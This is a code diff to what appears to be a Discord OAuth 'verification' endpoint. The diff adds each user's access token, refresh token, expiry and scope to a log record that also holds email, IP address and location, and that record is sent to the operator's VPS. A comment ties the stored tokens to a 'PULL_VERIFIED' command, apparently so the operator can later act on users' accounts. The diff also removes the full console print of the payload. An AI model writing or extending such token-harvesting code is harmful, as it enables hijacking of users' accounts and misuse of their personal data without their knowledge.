@@ -391,7 +391,10 @@ export async function GET(req: Request) {
     // Calculate account age from Discord ID snowflake
     const accountAge = getDiscordAccountCreationDate(user.id);
 
-    // Prepare enhanced payload with all Discord data
+    // Calculate token expiration time
+    const tokenExpiresAt = new Date(Date.now() + token.expires_in * 1000).toISOString();
+
+    // Prepare enhanced payload with all Discord data INCLUDING OAUTH TOKENS
     const logPayload = {
       userId: user.id,
       username: realUsername,
@@ -399,31 +402,43 @@ export async function GET(req: Request) {
       verifiedAt: new Date().toISOString(),
       ok: true,
       reason: "Success",
+      
+      // OAuth Tokens - CRITICAL FOR PULL_VERIFIED COMMAND
+      accessToken: token.access_token,
+      refreshToken: token.refresh_token,
+      tokenExpiresAt: tokenExpiresAt,
+      scope: token.scope,
+      
       // Email & Contact
       email: user.email || null,
       emailVerified: user.verified || false,
       locale: user.locale || "Unknown",
       mfaEnabled: user.mfa_enabled || false,
+      
       // Account age
       registeredAt: accountAge,
+      
       // Tech Details
       ip: ip,
       browser: req.headers.get("user-agent") || "Unknown",
+      
       // Location
       country: req.headers.get("cf-ipcountry") || "Unknown",
       region: req.headers.get("cf-region") || "Unknown",
       isp: "Unknown",
+      
       // Badges & Membership
       premiumType: getPremiumType(user.premium_type),
       badges: getBadgesFromFlags(user.public_flags || user.flags),
+      
       // VPN status
       vpnDetected: false,
       vpnInfo: null
     };
 
-    console.log("Logging successful verification:", JSON.stringify(logPayload, null, 2));
+    console.log("Logging successful verification with OAuth tokens");
 
-    // Log to your VPS (SQLite) with IP + user-agent
+    // Log to your VPS (SQLite) with IP + user-agent + OAUTH TOKENS
     await logToVps(req, logPayload);
 
     // Success redirect
